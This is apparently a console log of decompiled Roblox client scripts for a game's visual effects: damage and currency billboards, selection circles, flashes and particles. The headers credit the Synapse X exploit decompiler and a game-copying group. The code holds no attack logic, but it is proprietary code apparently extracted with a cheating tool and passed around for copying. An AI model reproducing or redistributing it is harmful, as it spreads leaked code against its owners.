	RewardBillboard.Transparency = 1;
	RewardBillboard.CFrame = p1;
	RewardBillboard.Name = "RewardBillboard";
	RewardBillboard.Parent = __DEBRIS;
	local Clone_ret = Assets.Billboards:FindFirstChild(u1 and "Critical" or "Damage"):Clone();
	Clone_ret.Parent = RewardBillboard;
	local v2 = "-" .. m_Functions.Commas(v1);
	Clone_ret.Damage.Text = v2;
	for _, child1 in ipairs(Clone_ret.Damage:GetChildren()) do
		if child1.ClassName ~= "TextLabel" then continue end
		child1.Text = v2;
	end
	local coroutine_wrap_ret = coroutine.wrap(function() -- Line: 65
		--[[
			Upvalues:
				[1] = Clone_ret
				[2] = u1
				[3] = m_Functions
		--]]
		local t_Size = Clone_ret.Size;
		local v3 = u1 and 3 or 2;
		Clone_ret.Size = UDim2.new(Clone_ret.Size.X.Scale * v3, Clone_ret.Size.X.Offset * v3, Clone_ret.Size.Y.Scale * v3, Clone_ret.Size.Y.Offset * v3);
		m_Functions.Wait(u1 and 0.08 or 0.05);
		m_Functions.Tween(Clone_ret, {Size = t_Size}, {
			0.1,
			"Sine",
			"Out"
		});
	end);
	coroutine_wrap_ret();
	if u1 then
		local coroutine_wrap_ret3 = coroutine.wrap(function() -- Line: 75
			--[[
				Upvalues:
					[1] = Clone_ret
					[2] = m_Functions
			--]]
			Clone_ret.Damage:FindFirstChildOfClass("UIGradient").Enabled = false;
			m_Functions.Wait(0.05);
			Clone_ret.Damage:FindFirstChildOfClass("UIGradient").Enabled = true;
		end);
		coroutine_wrap_ret3();
	end
	local coroutine_wrap_ret2 = coroutine.wrap(function() -- Line: 83
		--[[
			Upvalues:
				[1] = Random_new_ret
				[2] = m_Functions
				[3] = Clone_ret
				[4] = RunService
		--]]
		local os_clock_ret = os.clock();
		local NextNumber_ret = Random_new_ret:NextNumber(-3, 3);
		local NextNumber_ret2 = Random_new_ret:NextNumber(3.5, 5);
		local NextNumber_ret3 = Random_new_ret:NextNumber(-3, 3);
		while os.clock() - os_clock_ret <= 1.3 do
			local v4 = m_Functions.Easing((os.clock() - os_clock_ret) / 1.3, "Sine", "Out");
			local _ = Clone_ret.StudsOffsetWorldSpace;
			Clone_ret.StudsOffsetWorldSpace = Vector3.new(NextNumber_ret * v4, NextNumber_ret2 * v4 * math.sin(v4 * math.pi), NextNumber_ret3 * v4);
			RunService.RenderStepped:Wait();
		end
	end);
	coroutine_wrap_ret2();
	local udim2 = UDim2.new(0, 0, 0, 0);
	m_Functions.Tween(Clone_ret, {Size = udim2}, {
		0.4,
		"Back",
		"Out"
	}, 0.9).Completed:Connect(function() -- Line: 100
		--[[
			Upvalues:
				[1] = RewardBillboard
		--]]
		RewardBillboard:Destroy();
	end);
end;
  -  Editar
  04:54:13.759    -  Editar
  04:54:13.759  ----- [2307] ReplicatedStorage.Library.Client.WorldFX.AddCurrency -----  -  Editar
  04:54:13.759  -- Decompiled with the Synapse X Luau decompiler.

local l__ReplicatedStorage__1 = game:GetService("ReplicatedStorage");
local l__Library__2 = l__ReplicatedStorage__1:WaitForChild("Library");
local v3 = require(l__Library__2.Shared);
local l__Assets__1 = l__ReplicatedStorage__1:WaitForChild("Assets");
local u2 = {};
local u3 = require(l__Library__2.Functions);
local l____DEBRIS__4 = workspace:WaitForChild("__DEBRIS");
local u5 = require(l__Library__2.Directory);
return function(p1, p2, p3, p4)
	if typeof(p1) == "Vector3" then
		p1 = CFrame.new(p1);
	end;
	debug.profilebegin("AddCurrency");
	local v4 = l__Assets__1.Billboards:FindFirstChild("Reward"):Clone();
	if p3 == "Diamonds" then
		p1 = p1 + Vector3.new(0, 3, 0);
	elseif p3 == "Halloween Candy" or p3 == "Gingerbread" or p3 == "Valentine Hearts" or p3 == "Clover Coins" or p3 == "Easter Coins" then
		p1 = p1 + Vector3.new(0, -3, 0);
	end;
	local v5 = false;
	if p4 then
		debug.profilebegin("AddCurrency.TryCombine");
		for v6, v7 in pairs(u2) do
			if not v6 then
				u2[v6] = nil;
			elseif v7.currencyType == p3 and (p1.Position - v7.pos).Magnitude <= 10 then
				v5 = true;
				p2 = p2 + v7.amount;
				u2[v6] = nil;
				if v6.Parent then
					u3.AddDebris(v6.Parent, 0);
				end;
			end;
		end;
		u2[v4] = {
			pos = p1.Position, 
			amount = p2, 
			currencyType = p3
		};
		debug.profileend();
	end;
	local v8 = Instance.new("Part");
	v8.Anchored = true;
	v8.CanCollide = false;
	v8.CanTouch = false;
	v8.CanQuery = false;
	v8.Size = Vector3.new();
	v8.Transparency = 1;
	v8.CFrame = p1;
	v8.Name = "RewardBillboard";
	v8.Parent = l____DEBRIS__4;
	v4.amount.AutoLocalize = false;
	v4.amount.Text = u3.FormatAbbreviated(p2);
	p3 = p3 or "Coins";
	local v9 = u5.Currency[p3];
	v4.icon.Image = v9.Image;
	v4.icon.shadow.Image = v9.Image;
	v9.Gradient:Clone().Parent = v4.amount;
	v4.Parent = v8;
	local v10
	if v5 then
		v10 = 1.3;
	else
		v10 = 1.3;
	end;
	v4.Size = UDim2.new(v4.Size.X.Scale * v10, v4.Size.X.Offset * v10, v4.Size.Y.Scale * v10, v4.Size.Y.Offset * v10);
	local l__Size__6 = v4.Size;
	task.delay(0.05, function()
		u3.Tween(v4, {
			Size = l__Size__6
		}, { 0.1, "Expo", "Out" });
	end);
	if v5 then
		local v11 = v4:FindFirstChild("amount"):FindFirstChildOfClass("UIGradient");
		v11.Enabled = false;
		task.delay(0.075, function()
			v11.Enabled = true;
		end);
	end;
	local function u7()
		debug.profilebegin("AddCurrency.FadeOut");
		local v12 = nil;
		for v13, v14 in ipairs(v4:GetDescendants()) do
			if v14.ClassName == "TextLabel" then
				v12 = u3.Tween(v14, {
					TextTransparency = 1, 
					TextStrokeTransparency = 1
				}, { 0.7, "Sine", "Out" });
			elseif v14.ClassName == "ImageLabel" then
				v12 = u3.Tween(v14, {
					ImageTransparency = 1
				}, { 0.7, "Sine", "Out" });
			elseif v14.ClassName == "UIStroke" then
				v12 = u3.Tween(v14, {
					Transparency = 1
				}, { 0.7, "Sine", "Out" });
			end;		
		end;
		debug.profileend();
		v12.Completed:Wait();
		u3.AddDebris(v8, 0);
		u2[v4] = nil;
	end;
	u3.Tween(v4, {
		StudsOffsetWorldSpace = v4.StudsOffsetWorldSpace + Vector3.new(0, 1, 0)
	}, { 1.9000000000000001, "Quint", "Out" }).Completed:Connect(function()
		if v4 and v4.Parent then
			u7();
		end;
	end);
	debug.profileend();
end;
  -  Editar
  04:54:13.759    -  Editar
  04:54:13.759  ----- [2308] ReplicatedStorage.Library.Client.WorldFX.QuestGlow -----  -  Editar
  04:54:13.760  -- Decompiled with Synapse X v3.0 | https://github.com/synllc

local RunService = game:GetService("RunService");
return function(p1, p2, p3, p4) -- Line: 37
	--[[
		Upvalues:
			[1] = RunService
	--]]
	local u1 = p2 or 1;
	local u2 = p3 or 0.8;
	local v1 = p4 == true;
	if not p1 then
		warn("Object is missing");
		return function() -- Line: 49
		end;
	end
	local table1 = {};
	if p1:IsA("BasePart") then
		table.insert(table1, p1);
	end
	for _, descendant1 in ipairs(p1:GetDescendants()) do
		if not descendant1:IsA("BasePart") or descendant1.Name == "Grinch" or descendant1.Name == "TrappedPet" then continue end
		table.insert(table1, descendant1);
	end
	local table2 = {
		Enum.NormalId.Back,
		Enum.NormalId.Front,
		Enum.NormalId.Left,
		Enum.NormalId.Right,
		Enum.NormalId.Top,
		Enum.NormalId.Bottom
	};
	local table3 = {};
	for _, val2 in ipairs(table1) do
		for index1 = 1, 6 do
			local _SELECTIONFX = Instance.new("Decal");
			_SELECTIONFX.Texture = "rbxassetid://6381483576";
			_SELECTIONFX.Name = "_SELECTIONFX";
			_SELECTIONFX.Transparency = u2;
			_SELECTIONFX.Face = table2[index1];
			_SELECTIONFX.Parent = val2;
			table.insert(table3, _SELECTIONFX);
		end
	end
	local Connect_ret = nil;
	local function destroy() -- Line: 94
		--[[
			Upvalues:
				[1] = Connect_ret
				[2] = table3
		--]]
		if Connect_ret then
			Connect_ret:Disconnect();
		end
		for _, val3 in ipairs(table3) do
			if not val3 then continue end
			val3:Destroy();
		end
	end
	local u4 = 0;
	if not v1 then
		Connect_ret = RunService.RenderStepped:Connect(function(p5) -- Line: 107
			--[[
				Upvalues:
					[1] = p1
					[2] = table3
					[3] = destroy
					[4] = u4
					[5] = u1
					[6] = u2
			--]]
			if not p1 or not p1.Parent or not table3[1] then
				destroy();
				return;
			end
			u4 = u4 + p5;
			local v2 = u2 + (1 - u2) * ((math.cos(math.pi * 1.6 * u1 * u4) + 1) / 2);
			for _, val4 in ipairs(table3) do
				if not val4 then
					destroy();
					return;
				end
				val4.Transparency = v2;
			end
		end);
	end
	return destroy;
end;
  -  Editar
  04:54:13.760    -  Editar
  04:54:13.760  ----- [2309] ReplicatedStorage.Library.Client.WorldFX.CoinSelection -----  -  Editar
  04:54:13.760  -- BIG Copies OneX @localonex .gg/bigcopies

local ReplicatedStorage = game:GetService("ReplicatedStorage");
local RunService = game:GetService("RunService");
local Assets = ReplicatedStorage:WaitForChild("Assets");
local __DEBRIS = workspace:WaitForChild("__DEBRIS");
return function(p1, p2, p3) -- Line: 31
	--[[
		Upvalues:
			[1] = Assets
			[2] = __DEBRIS
			[3] = RunService
	--]]
	local v1 = p3 or Color3.new(1, 1, 1);
	local bool1 = false;
	local Coin = p2:FindFirstChild("Coin");
	if not Coin or Coin:GetAttribute("DisableSelectionCircle") then
		return function() -- Line: 36
		end;
	end
	local bool2 = false;
	local Clone_ret = Assets.Other.Selection:FindFirstChild("DottedLine"):Clone();
	local Clone_ret2 = Assets.Other.Selection:FindFirstChild("SelectionCircle"):Clone();
	local Clone_ret3 = Assets.Other.Selection:FindFirstChild("SelectionCircle"):Clone();
	local Attachment = Clone_ret2:FindFirstChild("Attachment");
	local Attachment2 = Clone_ret3:FindFirstChild("Attachment");
	Clone_ret.Attachment0 = Attachment;
	Clone_ret.Attachment1 = Attachment2;
	Clone_ret.Color = ColorSequence.new(v1);
	Clone_ret2.SurfaceGui.Circle.ImageColor3 = v1;
	Clone_ret3.SurfaceGui.Circle.ImageColor3 = v1;
	local function UpdateCoin() -- Line: 53
		--[[
			Upvalues:
				[1] = p2
				[2] = Coin
				[3] = bool1
		--]]
		if p2 and p2.Parent then
			Coin = p2:FindFirstChild("Coin");
			if Coin then return end
		end
		bool1 = true;
	end
	while true do
		if p2 and p2.Parent then
			Coin = p2:FindFirstChild("Coin");
			if Coin then
				break;
			end
		end
		bool1 = true;
		break;
	end
	local coroutine_wrap_ret = coroutine.wrap(function() -- Line: 67
		--[[
			Upvalues:
				[1] = bool1
				[2] = p1
				[3] = Coin
				[4] = Clone_ret2
				[5] = Clone_ret3
				[6] = Attachment
				[7] = Attachment2
				[8] = bool2
				[9] = Clone_ret
				[10] = __DEBRIS
				[11] = RunService
				[12] = p2
		--]]
		while not bool1 and p1.Parent do
			local __MAP = game.Workspace:WaitForChild("__MAP");
			for index1 = 1, 2 do
				local v6 = index1 == 1 and p1 or Coin;
				local v7 = index1 == 1 and Clone_ret2 or Clone_ret3;
				local Ray_new_ret = Ray.new(v6.CFrame.Position, Vector3.new(0, -1, 0).Unit * 300);
				local FindPartOnRayWithWhitelist_ret1, FindPartOnRayWithWhitelist_ret2, _ = game.Workspace:FindPartOnRayWithWhitelist(Ray_new_ret, {__MAP});
				if FindPartOnRayWithWhitelist_ret1 and FindPartOnRayWithWhitelist_ret2 then
					v7.CFrame = CFrame.new(v6.Position.X, FindPartOnRayWithWhitelist_ret2.Y + 0, v6.Position.Z);
				end
			end
			local math_max_ret = math.max(p1.Size.X, p1.Size.Z);
			local math_max_ret2 = math.max(Coin.Size.X, Coin.Size.Z);
			Clone_ret2.Size = Vector3.new(math_max_ret + 1.5, 0.05, math_max_ret + 1.5);
			Clone_ret3.Size = Vector3.new(math_max_ret2 + 1.5, 0.05, math_max_ret2 + 1.5);
			Attachment.Position = Vector3.new(0, 0, -Clone_ret2.Size.Z / 2);
			Attachment2.Position = Vector3.new(0, 0, -Clone_ret3.Size.Z / 2);
			local v2 = CFrame.new(Clone_ret2.CFrame.Position, Clone_ret3.CFrame.Position) + Vector3.new(0, 0.025, 0);
			local v3 = CFrame.new(Clone_ret3.CFrame.Position, Clone_ret2.CFrame.Position) + Vector3.new(0, 0.025, 0);
			local table1 = {v2:ToOrientation()};
			local table2 = {v3:ToOrientation()};
			local v4 = CFrame.new(v2.Position) * CFrame.fromOrientation(0, table1[2], 0);
			local v5 = CFrame.new(v3.Position) * CFrame.fromOrientation(0, table2[2], 0);
			Clone_ret2.CFrame = v4;
			Clone_ret3.CFrame = v5;
			if not bool2 then
				bool2 = true;
				Clone_ret.Parent = Clone_ret2;
				Clone_ret2.Parent = __DEBRIS;
				Clone_ret3.Parent = __DEBRIS;
			end
			RunService.RenderStepped:Wait();
			while true do
				if p2 and p2.Parent then
					Coin = p2:FindFirstChild("Coin");
					if Coin then
						break;
					end
				end
				bool1 = true;
				break;
			end
		end
		Clone_ret2:Destroy();
		Clone_ret3:Destroy();
	end);
	coroutine_wrap_ret();
	return function() -- Line: 129
		--[[
			Upvalues:
				[1] = bool1
		--]]
		bool1 = true;
	end;
end;
  -  Editar
  04:54:13.760    -  Editar
  04:54:13.760  ----- [2310] ReplicatedStorage.Library.Client.WorldFX.ModelFlash -----  -  Editar
  04:54:13.760  -- Decompiled with Synapse X v3.0 | https://github.com/synllc

local ReplicatedStorage = game:GetService("ReplicatedStorage");
local Library = ReplicatedStorage:WaitForChild("Library");
local __DEBRIS = workspace:WaitForChild("__DEBRIS");
local m_Functions = require(Library.Functions);
return function(p1, p2, p3) -- Line: 36
	--[[
		Upvalues:
			[1] = m_Functions
			[2] = __DEBRIS
	--]]
	local u1 = p3 or Color3.new(1, 1, 1);
	local u2 = p2 or 1;
	local Model = Instance.new("Model");
	Model.Name = "Explosion FX";
	local function CleanPart(p4) -- Line: 44
		--[[
			Upvalues:
				[1] = u1
		--]]
		p4.Color = u1;
		p4.Material = Enum.Material.Neon;
		p4.Transparency = 0;
		p4.Anchored = true;
		p4.CanCollide = false;
		p4.CastShadow = false;
		if p4:IsA("MeshPart") then
			p4.TextureID = "";
		end
		for _, child2 in ipairs(p4:GetChildren()) do
			if child2:IsA("SpecialMesh") then
				child2.TextureId = "";
				continue;
			end
			if child2:IsA("BlockMesh") then continue end
			child2:Destroy();
		end
	end
	local function FX(p5) -- Line: 67
		--[[
			Upvalues:
				[1] = CleanPart
				[2] = Model
				[3] = m_Functions
				[4] = u2
		--]]
		local coroutine_wrap_ret = coroutine.wrap(function() -- Line: 68
			--[[
				Upvalues:
					[1] = p5
					[2] = CleanPart
					[3] = Model
					[4] = m_Functions
					[5] = u2
			--]]
			local Clone_ret = p5:Clone();
			CleanPart(Clone_ret);
			Clone_ret.Parent = Model;
			local v3 = Clone_ret.Size * 1.25;
			m_Functions.Tween(Clone_ret, {
				Size = v3,
				CFrame = Clone_ret.CFrame,
				Transparency = 1
			}, {
				1 / u2,
				"Expo",
				"Out"
			}).Completed:Wait();
			Clone_ret:Destroy();
		end);
		coroutine_wrap_ret();
	end
	Model.Parent = __DEBRIS;
	if p1:IsA("BasePart") then
		local coroutine_wrap_ret3 = coroutine.wrap(function() -- Line: 68
			--[[
				Upvalues:
					[1] = p1
					[2] = CleanPart
					[3] = Model
					[4] = m_Functions
					[5] = u2
			--]]
			local Clone_ret3 = p1:Clone();
			CleanPart(Clone_ret3);
			Clone_ret3.Parent = Model;
			local v1 = Clone_ret3.Size * 1.25;
			m_Functions.Tween(Clone_ret3, {
				Size = v1,
				CFrame = Clone_ret3.CFrame,
				Transparency = 1
			}, {
				1 / u2,
				"Expo",
				"Out"
			}).Completed:Wait();
			Clone_ret3:Destroy();
		end);
		coroutine_wrap_ret3();
	end
	for _, descendant1 in ipairs(p1:GetDescendants()) do
		if not descendant1:IsA("BasePart") then continue end
		local coroutine_wrap_ret2 = coroutine.wrap(function() -- Line: 68
			--[[
				Upvalues:
					[1] = descendant1
					[2] = CleanPart
					[3] = Model
					[4] = m_Functions
					[5] = u2
			--]]
			local Clone_ret2 = descendant1:Clone();
			CleanPart(Clone_ret2);
			Clone_ret2.Parent = Model;
			local v2 = Clone_ret2.Size * 1.25;
			m_Functions.Tween(Clone_ret2, {
				Size = v2,
				CFrame = Clone_ret2.CFrame,
				Transparency = 1
			}, {
				1 / u2,
				"Expo",
				"Out"
			}).Completed:Wait();
			Clone_ret2:Destroy();
		end);
		coroutine_wrap_ret2();
	end
	m_Functions.AddDebris(Model, 1 / u2 * 3);
end;
  -  Editar
  04:54:13.760    -  Editar
  04:54:13.760  ----- [2311] ReplicatedStorage.Library.Client.WorldFX.RewardBillboard -----  -  Editar
  04:54:13.760  -- Decompiled with Synapse X v3.0 | https://github.com/synllc

local ReplicatedStorage = game:GetService("ReplicatedStorage");
local RunService = game:GetService("RunService");
local Library = ReplicatedStorage:WaitForChild("Library");
local Assets = ReplicatedStorage:WaitForChild("Assets");
local __DEBRIS = workspace:WaitForChild("__DEBRIS");
local m_Functions = require(Library.Functions);
return function(p1, p2, p3, p4) -- Line: 35
	--[[
		Upvalues:
			[1] = __DEBRIS
			[2] = Assets
			[3] = m_Functions
			[4] = RunService
	--]]
	local _ = {};
	local v1 = typeof(p1) == "Vector3" and CFrame.new(p1) or p1;
	local u1 = p4 or 2;
	local RewardBillboard = Instance.new("Part");
	RewardBillboard.Anchored = true;
	RewardBillboard.CanCollide = false;
	RewardBillboard.Size = Vector3.new(0.05, 0.05, 0.05);
	RewardBillboard.Transparency = 1;
	RewardBillboard.CFrame = v1;
	RewardBillboard.Name = "RewardBillboard";
	RewardBillboard.Parent = __DEBRIS;
	local Clone_ret = Assets.Billboards:FindFirstChild(p3):Clone();
	local Descendants = Clone_ret:GetDescendants();
	if p2 then
		for _, val2 in ipairs(Descendants) do
			if val2.ClassName ~= "TextLabel" then continue end
			val2.Text = p2;
		end
	end
	local t_Size = Clone_ret.Size;
	Clone_ret.Size = UDim2.new(Clone_ret.Size.X.Scale * 0.5, Clone_ret.Size.X.Offset * 0.5, Clone_ret.Size.Y.Scale * 0.5, Clone_ret.Size.Y.Offset * 0.5);
	m_Functions.Tween(Clone_ret, {Size = t_Size}, {
		0.5,
		"Expo",
		"Out"
	});
	Clone_ret.Parent = RewardBillboard;
	local coroutine_wrap_ret = coroutine.wrap(function() -- Line: 88
		--[[
			Upvalues:
				[1] = Clone_ret
				[2] = u1
				[3] = m_Functions
				[4] = RunService
		--]]
		local os_clock_ret = os.clock();
		local t_StudsOffsetWorldSpace = Clone_ret.StudsOffsetWorldSpace;
		while Clone_ret and Clone_ret.Parent and os.clock() - os_clock_ret <= u1 do
			Clone_ret.StudsOffsetWorldSpace = t_StudsOffsetWorldSpace + Vector3.new(0, m_Functions.Easing((os.clock() - os_clock_ret) / u1, "Linear", "InOut") * 3, 0);
			RunService.RenderStepped:Wait();
		end
	end);
	coroutine_wrap_ret();
	local v2 = nil;
	for _, descendant1 in ipairs(Clone_ret:GetDescendants()) do
		if descendant1.ClassName == "TextLabel" then
			v2 = m_Functions.Tween(descendant1, {
				TextTransparency = 1,
				TextStrokeTransparency = 1
			}, {
				0.5,
				"Linear",
				"Out"
			}, u1 - 0.5);
			continue;
		end
		if descendant1.ClassName == "ImageLabel" then
			v2 = m_Functions.Tween(descendant1, {ImageTransparency = 1}, {
				0.5,
				"Linear",
				"Out"
			}, u1 - 0.5);
			continue;
		end
		if descendant1.ClassName ~= "UIStroke" then continue end
		m_Functions.Tween(descendant1, {Transparency = 1}, {
			0.5,
			"Linear",
			"Out"
		}, u1 - 0.5);
	end
	v2.Completed:Connect(function() -- Line: 112
		--[[
			Upvalues:
				[1] = RewardBillboard
		--]]
		RewardBillboard:Destroy();
	end);
	return Clone_ret, RewardBillboard;
end;
  -  Editar
  04:54:13.760    -  Editar
  04:54:13.760  ----- [2312] ReplicatedStorage.Library.Client.WorldFX.RewardImage -----  -  Editar
  04:54:13.760  -- Decompiled with Synapse X v3.0 | https://github.com/synllc

local ReplicatedStorage = game:GetService("ReplicatedStorage");
local RunService = game:GetService("RunService");
local Library = ReplicatedStorage:WaitForChild("Library");
local Assets = ReplicatedStorage:WaitForChild("Assets");
local __DEBRIS = workspace:WaitForChild("__DEBRIS");
local m_Functions = require(Library.Functions);
return function(p1, p2, p3, p4) -- Line: 39
	--[[
		Upvalues:
			[1] = Assets
			[2] = __DEBRIS
			[3] = m_Functions
			[4] = RunService
	--]]
	local v1 = typeof(p1) == "Vector3" and CFrame.new(p1) or p1;
	local v2 = p4 or {};
	local v3 = v2.color or Color3.new(1, 1, 1);
	local u1 = v2.time or 3;
	local Clone_ret = Assets.Billboards:FindFirstChild("Reward"):Clone();
	local RewardBillboard = Instance.new("Part");
	RewardBillboard.Anchored = true;
	RewardBillboard.CanCollide = false;
	RewardBillboard.Size = Vector3.new();
	RewardBillboard.Transparency = 1;
	RewardBillboard.CFrame = v1;
	RewardBillboard.Name = "RewardBillboard";
	RewardBillboard.Parent = __DEBRIS;
	Clone_ret.amount.Text = p2;
	Clone_ret.amount.TextColor3 = v3;
	Clone_ret.icon.Image = p3;
	Clone_ret.icon.shadow.Image = p3;
	Clone_ret.Parent = RewardBillboard;
	local coroutine_wrap_ret = coroutine.wrap(function() -- Line: 72
		--[[
			Upvalues:
				[1] = Clone_ret
				[2] = m_Functions
		--]]
		local t_Size = Clone_ret.Size;
		Clone_ret.Size = UDim2.new(Clone_ret.Size.X.Scale * 1.3, Clone_ret.Size.X.Offset * 1.3, Clone_ret.Size.Y.Scale * 1.3, Clone_ret.Size.Y.Offset * 1.3);
		m_Functions.Wait(0.05);
		m_Functions.Tween(Clone_ret, {Size = t_Size}, {
			0.1,
			"Sine",
			"Out"
		});
	end);
	coroutine_wrap_ret();
	local coroutine_wrap_ret2 = coroutine.wrap(function() -- Line: 81
		--[[
			Upvalues:
				[1] = Clone_ret
				[2] = u1
				[3] = m_Functions
				[4] = RunService
		--]]
		local os_clock_ret = os.clock();
		local t_StudsOffsetWorldSpace = Clone_ret.StudsOffsetWorldSpace;
		while os.clock() - os_clock_ret <= u1 do
			Clone_ret.StudsOffsetWorldSpace = t_StudsOffsetWorldSpace + Vector3.new(0, m_Functions.Easing((os.clock() - os_clock_ret) / u1, "Linear", "InOut") * 3, 0);
			RunService.RenderStepped:Wait();
		end
	end);
	coroutine_wrap_ret2();
	local v4 = nil;
	for _, descendant1 in ipairs(Clone_ret:GetDescendants()) do
		if descendant1.ClassName == "TextLabel" then
			v4 = m_Functions.Tween(descendant1, {
				TextTransparency = 1,
				TextStrokeTransparency = 1
			}, {
				0.5,
				"Linear",
				"Out"
			}, u1 - 0.5);
			continue;
		end
		if descendant1.ClassName == "ImageLabel" then
			v4 = m_Functions.Tween(descendant1, {ImageTransparency = 1}, {
				0.5,
				"Linear",
				"Out"
			}, u1 - 0.5);
			continue;
		end
		if descendant1.ClassName ~= "UIStroke" then continue end
		m_Functions.Tween(descendant1, {Transparency = 1}, {
			0.5,
			"Linear",
			"Out"
		}, u1 - 0.5);
	end
	v4.Completed:Connect(function() -- Line: 104
		--[[
			Upvalues:
				[1] = RewardBillboard
		--]]
		RewardBillboard:Destroy();
	end);
	return Clone_ret;
end;
  -  Editar
  04:54:13.761    -  Editar
  04:54:13.761  ----- [2313] ReplicatedStorage.Library.Client.WorldFX.PetSpawn -----  -  Editar
  04:54:13.761  -- Decompiled with Synapse X v3.0 | https://github.com/synllc

local ReplicatedStorage = game:GetService("ReplicatedStorage");
local Library = ReplicatedStorage:WaitForChild("Library");
local Assets = ReplicatedStorage:WaitForChild("Assets");
local m_Functions = require(Library.Functions);
return function(p1) -- Line: 11
	--[[
		Upvalues:
			[1] = Assets
			[2] = m_Functions
	--]]
	local Clone_ret = Assets.Particles:FindFirstChild("Pet Spawn"):Clone();
	local v1 = m_Functions.CreateParticleHost(p1);
	Clone_ret.Parent = v1;
	Clone_ret:Emit(8);
	m_Functions.AddDebris(v1, 4);
end;
  -  Editar
  04:54:13.761    -  Editar
  04:54:13.761  ----- [2314] ReplicatedStorage.Library.Client.WorldFX.Explosion -----  -  Editar
  04:54:13.761  -- Decompiled with Synapse X v3.0 | https://github.com/synllc

local ReplicatedStorage = game:GetService("ReplicatedStorage");
local Library = ReplicatedStorage:WaitForChild("Library");
local Assets = ReplicatedStorage:WaitForChild("Assets");
local m_Functions = require(Library.Functions);
return function(p1) -- Line: 11
	--[[
		Upvalues:
			[1] = Assets
			[2] = m_Functions
	--]]
	local Clone_ret = Assets.Particles:FindFirstChild("Pet Boom"):Clone();
	local v1 = m_Functions.CreateParticleHost(p1);
	Clone_ret.Parent = v1;
	Clone_ret:Emit(3);
	m_Functions.AddDebris(v1, 4);
end;
  -  Editar
  04:54:13.761    -  Editar
  04:54:13.761  ----- [2315] ReplicatedStorage.Library.Client.WorldFX.CometDespawn -----  -  Editar
  04:54:13.761  -- Decompiled with Synapse X v3.0 | https://github.com/synllc

local ReplicatedStorage = game:GetService("ReplicatedStorage");
local Library = ReplicatedStorage:WaitForChild("Library");
local Assets = ReplicatedStorage:WaitForChild("Assets");
local m_Functions = require(Library.Functions);
return function(p1) -- Line: 11
	--[[
		Upvalues:
			[1] = Assets
			[2] = m_Functions
	--]]
	task.spawn(function() -- Line: 12
		--[[
			Upvalues:
				[1] = Assets
				[2] = m_Functions
				[3] = p1
		--]]
		local Clone_ret = Assets.Particles:FindFirstChild("Comet Despawn"):Clone();
		local v1 = m_Functions.CreateParticleHost(p1);
		Clone_ret.Parent = v1;
		Clone_ret:Emit(8);
		m_Functions.AddDebris(v1, 4);
	end);
end;
  -  Editar
  04:54:13.761    -  Editar
  04:54:13.761  ----- [2316] ReplicatedStorage.Library.Client.RAPCmds -----  -  Editar
  04:54:13.762  --[[    
                                                                   ,,╓╓╖╖╥╥@@@,,,╓╖╖╖
                                                            ,,╓╓╖╖╖@@@╢╢║╢╢╣▒▒▒▒▒▒▒▒▒
                                          ,,,╓╖╖╖╥@@@╢╢╢╢╢▒▒▒╢╢╜╜╙````"╙╜╢╣▒▒▒▒▒▒▒▒▒▒
                         ,,,╓╖╖╥@@@@╢║╢╢▒▒╢╢╢Ñ╨╨╨▒▒▒▒▒▒▒▒▒╢╜`              ╙╢▒▒▒▒▒▒▒▒
        ,,╓╖╖╖╥@@@╢╢╢╢╢▒▒╢╢╢╢╢╢╢▒▒▒▒▒▒▒▒▒▒       ╢▒▒▒▒▒▒▒╜                   ╙╢▒▒▒▒▒▒
        ]▒▒▒▒▒╜╜╙"``              ╙╢▒▒▒▒▒▒░      ║▒▒▒▒▒▒╜       ╥@╣╢╢@╖       ,╢▒▒▒▒▒▒
         ▒▒▒▒▒L                     ╙╢▒▒▒▒▒      ]▒▒▒▒▒▒      ,╣▒▒▒▒▒▒▒╢╖,╓@╣╢▒▒▒▒▒▒▒▒
         ║▒▒▒▒▒        ,,,╓╓╓,       ]▒▒▒▒╣       ╢▒▒▒▒       ║▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒▒       ╢▒▒▒▒▒▒▒@       ▒▒▒▒▒       ║▒▒▒▒       ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ]▒▒▒▒▒       ║▒▒▒▒▒▒▒Ñ      ,▒▒▒▒▒▒      ]▒▒▒▒       ╢▒▒▒▒▒╜╜╜╙"``     └▒▒▒▒▒▒s
          ▒▒▒▒▒▒      ╙╝╨╜╜╜╙       ╓╢▒▒▒▒▒▒      └▒▒▒▒       ║▒▒▒▒▒             ╢▒▒▒▒▒
          ║▒▒▒▒▒                   ╙╨╢▒▒▒▒▒╢       ║▒▒▒H      ╙▒▒▒▒▒▒            ║▒▒▒▒▒░
          ]▒▒▒▒▒                      ╙╢▒▒▒▒       ║▒▒▒╢       ║▒▒▒▒╢@@@╣╢C      ]▒▒▒▒▒▒
           ▒▒▒▒▒~      ╓╖╥@@@@@@,      `╢▒▒▒▒      ]▒▒▒▒H       ╙╣▒▒▒▒▒▒▒╜        ▒▒▒▒▒▒
           ║▒▒▒▒▒      ]▒▒▒▒▒▒▒▒▒∩      ║▒▒▒╣       ▒▒▒▒▒╖        ╙╨╝╝╜╜          ║▒▒▒▒▒
           ║▒▒▒▒╣       ╢▒▒▒▒▒▒▒▒░      ]▒▒▒▒       ║▒▒▒▒▒Ñ                       ╠▒▒▒▒▒∩
           └▒▒▒▒▒       ║▒▒╢╢╢╝╜`       ║▒▒▒▒▒      ]▒▒▒▒▒▒▒@╖             ╓╣.,,,╓║▒▒▒▒▒▒
            ╢▒▒▒▒▒                     ║▒▒▒▒▒▒      └▒▒▒▒▒▒▒▒▒╣╢@╥╖╖╖╖╖@@╢▒▒▒▒▒╢╢╢╝╨╜╜╜╙"
            ║▒▒▒▒▒                  ╓@╢▒▒▒▒▒▒▒╖╓╖╖╥@@▒▒▒▒▒▒▒▒▒╢╢╢╨╜╜╜╜╙╙``
            ]▒▒▒▒▒        ,,,╓╓╖@@╣╢▒▒▒▒▒▒▒▒▒╢║╨╨╜╜╜╙╙"``        ,,╓╓╖╥╗   ,@╢▒▒▒╣╣╗
             ▒▒▒▒▒Ñ@╣╢╢╣▒▒▒╢╢║╨╨╜╜╜╙╙`'        ,,,╓╖,    ║╣╢   ╢▒▒▒▒▒▒╢╢H ╓▒▒╢╙``╙╨Ñ
             ╨╜╜╜╜╙"``            ╓╥@@@╥╖    ║▒▒▒▒▒▒▒▒N  ║▒▒[  ║▒▒U       ]▒▒╢╖,,
